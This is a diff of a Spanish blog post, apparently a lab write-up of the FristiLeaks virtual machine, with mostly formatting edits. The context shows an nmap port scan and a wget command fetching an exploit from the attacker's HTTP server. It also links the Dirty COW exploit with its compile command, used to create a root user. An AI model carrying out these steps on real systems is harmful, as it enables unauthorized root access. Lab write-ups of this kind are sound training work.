@@ -12,9 +12,9 @@ En primer lugar hay que identificar la dirección IP de la máquina virtual obje
 
 El primer paso dentro de la enumeración será el de ver puertos abiertos y servicios activos en ellos. Para ello hacemos uso de nmap con la instrucción “nmap -Pn -p- 192.168.1.70” para **escanear todos los puertos**. El resultado es el siguiente:
 
-Not shown: 65534 filtered ports
-PORT   STATE SERVICE
-**80/tcp open  http**
+Not shown: 65534 filtered ports  
+PORT   STATE SERVICE  
+**80/tcp open  http**  
 
 Siendo este un entorno controlado y sin limitaciones ni nada que nos frenes, podríamos haber explotado al máximo la velocidad de nmap haciendo uso de la siguiente instrucción que también escaneará todos los puertos, a más velocidad y nos almacenará el resultado en un fichero llamado allPorts:
 
@@ -120,12 +120,12 @@ Una vez descargado en local tenemos que subir dicho exploit a la máquina objeti
 
 **En la máquina objetivo nos descargamos el fichero** en la carpeta /tmp haciendo uso de curl o wget, por ejemplo de la siguiente forma: “wget 192.168.1.45:8000/10018.sh”. Siendo la dirección IP la de la máquina atacante donde tenemos activo el servidor de SimpleHTTPServer. 
 
-Este exploit no consigue su objetivo, no funciona. **Después de probar varios exploits sin éxito llego a un exploit que ataca la vulnerabilidad Dirty COW, el exploit es el siguiente: [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c).
+Este exploit no consigue su objetivo, no funciona. **Después de probar varios exploits sin éxito llego a un exploit que ataca la vulnerabilidad Dirty COW, el exploit es el siguiente: [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c).**
 Lo subo a la carpeta /tmp tal como expliqué antes y lo compilo siguiendo las instrucciones que se indican en el propio exploit, es decir, con **“gcc -pthread dirty.c -o dirty -lcrypt”**
 
 Una vez compilado lo ejecuto, le introduzco una contraseña y, después de algunos minutos, termina su ejecución. 
 
-**Esto te genera un usuario llamado firefart con la contraseña introducida con permisos de root:**
+**Esto nos genera un usuario llamado firefart con la contraseña introducida con permisos de root:**
 
 ![FristiLeaks 04]({{ site.baseurl }}/images/fristileaks04.png)
 
